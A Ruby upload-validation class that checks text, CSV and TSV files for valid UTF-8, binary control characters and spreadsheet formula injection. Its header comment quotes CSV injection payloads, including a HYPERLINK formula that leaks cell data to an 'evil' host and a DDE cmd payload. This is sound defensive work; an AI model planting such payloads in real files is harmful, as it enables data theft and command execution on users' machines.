# frozen_string_literal: true

module UploadInspector
  # Plain text, CSV and TSV. Text has no magic bytes, so the type comes from the name alone;
  # this check proves the content really is text:
  #
  # - valid UTF-8 (a UTF-8 BOM is allowed; UTF-16 and legacy code pages are rejected)
  # - no NUL or control characters other than tab, CR and LF, so a binary cannot pass as .csv
  # - CSV/TSV only, unless allow_csv_formulas: no cell that a spreadsheet would run as a
  #   formula calling a function or another program (CSV injection), e.g.
  #   =HYPERLINK("http://evil/?"&A1), +cmd|' /C calc'!A0, @SUM(1)
  class TextInspector
    include Rejectable

    TYPES = %w[text/plain text/csv text/tab-separated-values].freeze
    SPREADSHEET_TYPES = %w[text/csv text/tab-separated-values].freeze
    UTF8_BOM = "\xEF\xBB\xBF".b
    UTF16_BOM = /\A(?:\xFF\xFE|\xFE\xFF)/n
    CONTROL = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/
    # A cell may start after any delimiter Excel splits on (comma, semicolon in European
    # locales, tab) or a line break, optionally quoted and padded. Every delimiter counts as a
    # possible cell start, also inside quoted text: over-approximating can only reject more. A
    # quoted value runs to its closing quote (across lines), an unquoted one to the next delimiter.
    FORMULA_CELL = /(?:\A|[,;\t\r\n])[ \t]*(?:"\s*([=+\-@](?:[^"]|"")*)|([=+\-@][^,;\t\r\n]*))/
    # Running anything needs a function call (a name right before "(") or DDE
    # (program|topic!item); arithmetic, negative numbers, phone numbers like +1 (555) 010 and
    # @handles stay accepted.
    FORMULA_ACTION = /\p{L}[\p{L}\d_.]*\(|\|/

    def initialize(policy)
      @policy = policy
    end

    def verify!(path, type)
      reject!(:text_too_large, "exceeds #{@policy.max_inflate_size} bytes") if File.size(path) > @policy.max_inflate_size

      text = File.binread(path)
      reject!(:text_unsupported_encoding, 'UTF-16') if text.match?(UTF16_BOM)
      text = text.delete_prefix(UTF8_BOM).force_encoding(Encoding::UTF_8)
      reject!(:text_unsupported_encoding, 'not valid UTF-8') unless text.valid_encoding?
      reject!(:text_binary_content, 'control characters') if text.match?(CONTROL)
      check_formulas!(text) if SPREADSHEET_TYPES.include?(type) && !@policy.allow_csv_formulas
    end

  private

    def check_formulas!(text)
      text.scan(FORMULA_CELL) do |quoted, bare|
        cell = quoted || bare
        reject!(:csv_formula, cell[0, 40]) if cell.match?(FORMULA_ACTION)
      end
    end
  end
end
